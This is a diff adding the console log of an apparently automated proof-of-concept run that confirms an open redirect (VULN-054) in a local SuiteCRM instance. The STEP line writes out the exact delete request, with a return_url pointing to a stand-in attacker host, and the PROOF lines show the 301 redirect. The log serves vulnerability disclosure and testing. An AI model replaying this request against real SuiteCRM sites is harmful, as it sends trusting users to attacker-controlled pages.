@@ -1,0 +1,18 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-054/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-054/../.venv
+========================================================================
+VULN-054: SugarController post-delete redirect to raw return_url (framework-wide open redirect)
+target: http://localhost:33116
+========================================================================
+[SETUP] Provisioning a fresh low-privileged user (the redirect fires in ANY authenticated user's own session -- no admin rights needed).
+[OK] low-priv user mod_bf71d83d id=99211d5a-5e1b-43f5-9774-20fdcf80ccce
+[SETUP] Creating a Note owned by that user (legacy REST set_entry) -- a record the attacker genuinely owns, so the *delete* is legitimate
+[OK] Note created id=ec1267f4-c9c1-4d0f-855c-998323c4ea6c name=note_1da85f8c
+[SETUP] Web-login as the same low-priv user (session cookie)
+[STEP] GET http://localhost:33116/index.php?module=Notes&action=Delete&record=ec1267f4-c9c1-4d0f-855c-998323c4ea6c&return_url=https://evil-cvehunter-c054_505001ad.example/pwn  (own session, same-origin Referer)
+[PROOF] HTTP 301 Moved Permanently
+[PROOF] Location: 'https://evil-cvehunter-c054_505001ad.example/pwn'
+[STEP] Confirming via the db container that the delete really executed (notes.deleted=1) -- this is real post_delete() traffic
+[PROOF] notes.deleted for ec1267f4-c9c1-4d0f-855c-998323c4ea6c = '1' (db stderr: 'mysql: [Warning] Using a password on the command line interface can be insecure.')
+[OK] Delete executed for real (deleted=1) AND the trusted CRM origin redirected the user's browser off-site, verbatim, via return_url.
+==> VULN-054: CONFIRMED — module=Notes&action=Delete&return_url redirected (HTTP 301) to https://evil-cvehunter-c054_505001ad.example/pwn; notes.deleted=1
